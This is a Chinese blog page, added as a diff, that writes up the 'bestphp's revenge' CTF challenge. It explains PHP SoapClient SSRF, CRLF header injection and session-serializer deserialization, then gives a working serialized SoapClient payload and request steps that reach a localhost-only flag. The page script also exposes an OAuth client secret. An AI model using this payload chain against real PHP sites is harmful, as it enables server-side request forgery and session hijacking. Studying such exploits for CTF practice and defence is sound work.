@@ -1,0 +1,372 @@
+<!DOCTYPE HTML>
+<html>
+<head >
+  <meta charset="utf-8">
+  
+  <title>bestPHP | Hexo</title>
+
+  
+  <meta name="author" content="John Doe">
+  
+
+  
+  <meta name="description" content="知识点
+php内置类SoapClient
+CRLF Injection漏洞
+call_user_func
+PHPsession 反序列化
+
+SoapClientSOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(Univ">
+  
+
+  
+  
+  <meta name="keywords" content="">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="bestPHP"/>
+
+  <meta property="og:site_name" content="Hexo"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+  
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-5005349780815724",
+    enable_page_level_ads: true
+  });
+</script>
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?223eea22355699157e147870eb124b24";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+  <link rel="manifest" href="/manifest.json">
+  <link href="/favicon.ico" rel="icon">
+
+  <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    
+
+    <header class="header-container" style="background-image: url('/images/blog-bg.jpg');">
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <div class="navbar-header page-scroll">
+          <button type="button" id="tglBtn" class="navbar-toggle">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="/">John Doe</a>
+        </div>
+        <div id="bosenyblog-navbar">
+          <div class="navbar-collapse" id="bs-example-navbar-collapse-6">
+            <ul class="nav navbar-nav navbar-right">
+            
+              <li><a href="/">Home</a></li>
+            
+              <li><a href="/archives">Archives</a></li>
+            
+              <li><a href="/about">About</a></li>
+            
+              <li><a href="/tags">Tags</a></li>
+            
+            </ul>
+          </div>
+        </div>
+
+    </div>
+ </nav>
+ <div class="gotop-btn">
+
+ </div>
+</header>
+
+        
+          <div class="container ">
+          <div class="row">
+            <main class="site-main posts-loop col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container" style="position: inherit;">
+            <article class="article-container ">
+
+  
+    
+    <h3 class="article-title"><span>bestPHP</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2025/02/03/bestPHP/" rel="bookmark">
+        <time class="entry-date published" datetime="2025-02-03T05:00:51.000Z">
+          2025-02-03
+        </time>
+      </a>
+    </span>
+    <br />
+    
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+    
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+          <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol>
+<li>php内置类SoapClient</li>
+<li>CRLF Injection漏洞</li>
+<li>call_user_func</li>
+<li>PHPsession 反序列化</li>
+</ol>
+<h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h3><p style="font-size:10px">SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。
+SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</p>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(location&#x27;=&gt;&#x27;http://example.com:2333&#x27;,&#x27;uri&#x27;=&gt;&#x27;123&#x27;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br><span class="line">//可以利用 SoapClient 类的 __call （当调用对象中不存在的方法会自动调用此方法）方法来进行 SSRF</span><br></pre></td></tr></table></figure>
+<h3 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h3><p style="font-size:10px">CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。
+简单来说
+http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而将剩下的部分当做体，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。</p>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &quot;http://localhost:2333&quot;;</span><br><span class="line">$options = array(</span><br><span class="line">    &quot;location&quot; =&gt; $target,</span><br><span class="line">    &quot;user_agent&quot; =&gt; &quot;mochazz\r\nCookie: PHPSESSID=123123\r\n&quot;,</span><br><span class="line">    &quot;uri&quot; =&gt; &quot;demo&quot;</span><br><span class="line">);</span><br><span class="line">$attack = new SoapClient(null,$options);</span><br><span class="line">$payload = serialize($attack);</span><br><span class="line">unserialize($payload)-&gt;ff(); // 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h3><p>call_user_func函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法。</p>
+<h3 id="PHPsession-反序列化"><a href="#PHPsession-反序列化" class="headerlink" title="PHPsession 反序列化"></a>PHPsession 反序列化</h3><table>
+<thead>
+<tr>
+<th align="center">Directive</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">session.save_handler</td>
+<td align="center">session保存形式。默认为files</td>
+</tr>
+<tr>
+<td align="center">session.save_path</td>
+<td align="center">session保存路径。</td>
+</tr>
+<tr>
+<td align="center">session.serialize_handler</td>
+<td align="center">session序列化存储所用处理器。默认为php。</td>
+</tr>
+<tr>
+<td align="center">session.upload_progress.cleanup</td>
+<td align="center">一旦读取了所有POST数据，立即清除进度信息。默认开启</td>
+</tr>
+<tr>
+<td align="center">session.upload_progress.enabled</td>
+<td align="center">将上传文件的进度信息存在session中。默认开启。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;name&#x27;] = &#x27;lvyz&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p style="font-size:13px">当 session.serialize_handler=php 时，session文件内容为： name|s:4:"lvyz";</p>
+
+<p style="font-size:13px">当 session.serialize_handler=php_serialize 时，session文件为： a:1:{s:4:"name";s:4:"lvyz";}</p>
+
+<p style="font-size:13px">当 session.serialize_handler=php_binary 时，session文件内容为： 二进制字符names:4:"lvyz";</p>
+当我们使用PHP引擎反序列化php_serialize引擎序列化内容时得到
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&#x27;name&#x27;] = &#x27;|username&#x27;</span><br><span class="line">a:1:&#123;s:4:&#x27;name&#x27;;s:4:&#x27;|username&#x27;;&#125;</span><br><span class="line">|被当作分隔符</span><br><span class="line">a:1:&#123;s:4:&#x27;name&#x27;;s:4:&#x27;被当作KEY</span><br><span class="line">username 被当作value进行反序列化</span><br></pre></td></tr></table></figure>
+
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h4 id="题目来源-https-buuoj-cn-challenges-bestphp-s-20revenge"><a href="#题目来源-https-buuoj-cn-challenges-bestphp-s-20revenge" class="headerlink" title="题目来源:https://buuoj.cn/challenges#bestphp&#39;s%20revenge"></a>题目来源:<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#bestphp's%20revenge">https://buuoj.cn/challenges#bestphp&#39;s%20revenge</a></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &#x27;implode&#x27;;</span><br><span class="line">call_user_func($_GET[&#x27;f&#x27;], $_POST);  //参数二的位置固定为 $_POST 数组，我们很容易便想到利用 extract 函数进行变量覆盖，以便配合后续利用</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_GET[&#x27;name&#x27;])) &#123;</span><br><span class="line">    $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">&#125;   //存在 session 伪造漏洞，我们可以考虑是否可以包含 session 文件或者利用 session 反序列化漏洞</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line">?&gt;</span><br><span class="line">array(0) &#123; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//flag.php  (扫目录扫到的)</span><br><span class="line">only localhost can get flag!session_start();</span><br><span class="line">echo &#x27;only localhost can get flag!&#x27;;</span><br><span class="line">$flag = &#x27;LCTF&#123;*************************&#125;&#x27;;</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">       $_SESSION[&#x27;flag&#x27;] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
+<p style="font-size:15px">通过flag.php文件得到信息，我们需要用127.0.0.1访问它才能得到flag，那么很明显就是要我们利用SSRF，回到题目的源码，我们的思路就是寻找能SSRF的点，这里就是利用SoapCLient内置类的__call方法进行，那么要利用它就是要进行反序列化，但是这里没有POP链，看到session_start我们可以尝试SESSION反序列化漏洞，我们先把靶机的serialize_handler改为phpserialize</p>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。这个特性也引入了一个新的 php.ini 设置（session.lazy_write）</span><br></pre></td></tr></table></figure>
+
+<p>我们传入f&#x3D;session_start,post:array(‘serialize_handler’&#x3D;&gt;’php_serialize’),即可达到session_start(array(‘serialize_handler’ &#x3D;&gt; ‘php_serialize’)) 将他的serialize_handler改为php_serialize</p>
+<p>然后我们构造一个序列化字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target=&#x27;http://127.0.0.1/flag.php&#x27;;</span><br><span class="line">$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,</span><br><span class="line">    &#x27;user_agent&#x27; =&gt; &quot;npfs\r\nCookie:PHPSESSID=123456\r\n&quot;,</span><br><span class="line">    &#x27;uri&#x27; =&gt; &quot;http://127.0.0.1/&quot;));</span><br><span class="line"></span><br><span class="line">$se = serialize($b);</span><br><span class="line">echo &quot;|&quot;.urlencode($se);</span><br><span class="line"></span><br><span class="line">//注意下，这个脚本想要执行，需要将php.ini里的 php_soap.dll 前面的分号去掉</span><br><span class="line">这里的sessid需要记住，后面要指定sessid访问页面来让他进行反序列化</span><br><span class="line"></span><br><span class="line">|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A31%3A%22npfs%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>接下来就是让这一字符串写入到他的session文件当中,这样他的session文件中就是一个SOAP对象<br><img src="/../img/bestphp/1.jpg" alt="WEB!"><br>让他的session[‘name’]&#x3D;$_GET[‘name’]</p>
+<p>第二步：通过变量覆盖，调用SoapClient类，从而触发__call 方法传值f&#x3D;extract&amp;name&#x3D;SoapClient POST:b&#x3D;call_user_func. 这样 call_user_func($b,$a)就变成call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF。</p>
+<p>这里的,我们访问时他会解析上一步的session文件，这样的的session数组的第一个元素就是一个SOAP对象，这里我们对它进行访问XXXX2018方法，触发__call导致SSRF<br>在flag.php。会将flag赋值给$_SESSION[‘flag’]</p>
+<p>第三步：将PHPSESSID改为我们在SoapClient类里设置的123456即可得到flag</p>
+
+      
+    </div>
+    
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+
+    </div>
+
+    
+  </div>
+  
+    
+    
+  
+</article>
+   
+    <div id="toc" class="toc-article ">
+    <div class="toc-title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SoapClient"><span class="toc-number">1.1.</span> <span class="toc-text">SoapClient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRLF"><span class="toc-number">1.2.</span> <span class="toc-text">CRLF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-user-func"><span class="toc-number">1.3.</span> <span class="toc-text">call_user_func</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHPsession-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.4.</span> <span class="toc-text">PHPsession 反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-https-buuoj-cn-challenges-bestphp-s-20revenge"><span class="toc-number">2.0.1.</span> <span class="toc-text">题目来源:https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#bestphp&#39;s%20revenge</span></a></li></ol></li></ol></li></ol>
+</div>
+
+
+  
+
+	<!-- async load  -->
+	<script>
+			function async(u, c) {
+				var d = document, t = 'script',
+						o = d.createElement(t),
+						s = d.getElementsByTagName(t)[0];
+				o.src = u;
+				if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+				s.parentNode.insertBefore(o, s);
+			}
+	</script>
+	<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+	<script>
+			async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+					anchors.options = {
+						visible: 'hover',
+						placement: 'left',
+						// icon: '#'
+					};
+					anchors.add().remove('.article-title').remove('.subheading').remove('.sidebar-container h5');
+			})
+	</script>
+	<style>
+			/* place left on bigger screen */
+			@media all and (min-width: 800px) {
+					.anchorjs-link{
+							position: absolute;
+							left: -0.75em;
+							font-size: 1.1em;
+							margin-top : -0.1em;
+					}
+			}
+	</style>
+
+
+
+
+<!-- UY BEGIN -->
+	<div id="gitment-container"></div>
+	<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+	<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+	<script src="/js/web-pinyin.js"></script>
+	<script>
+		function toUnicode(s){ 
+			return s.replace(/([\u4E00-\u9FA5]|[\uFE30-\uFFA0])/g,function(){
+			return "\\u" + RegExp["$1"].charCodeAt(0).toString(16);
+			});
+		}
+		var title = 'bestPHP'
+		var GitHub_id = 'Boseny'
+		var client_id = 'f40c67d0359a2646d2b1'
+		var client_secret = '1cbedbd1a1a2e4b42901aee3d7afe1856c1b7e2d'
+		var repo = 'boseny.me'
+		var gitment = new Gitment({
+		// id: '页面 ID', // 可选。默认为 location.href
+		// id:"11" ,
+		id: title,
+		title: title,
+		owner: GitHub_id,//'你的 GitHub ID',
+		repo: repo,//'存储评论的 repo',
+		oauth: {
+			client_id: client_id,//'你的 client ID',
+			client_secret: client_secret,//'你的 client secret',
+		},
+		})
+		gitment.render('gitment-container')
+	</script>
+<!-- UY END -->
+
+
+
+
+            </main>
+          </div>
+        </div>
+       
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/BosenY/Lap" target="_blank">Lap</a>
+    <br/><span id="busuanzi_container_site_uv"> 
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    </br>
+    
+      
+        &copy; 2025 John Doe
+      
+    
+  </p>
+</footer>
+    
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-92842840-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+  </div>
+
+</div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.bootcss.com/vue/2.5.13/vue.min.js"></script>
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+  <script src="https://unpkg.com/draw-something/dist/draw.min.js"></script>
+  <script>
+    let maxNum = Number.parseInt('10')
+    let iconText = '❤'
+    let color = 'red'
+    new Draw({maxNum, iconText, color})
+  </script>
+
+<script src="/js/index.js"></script>
+<script src="/js/search.js"></script>
+
+</body>
+</html>
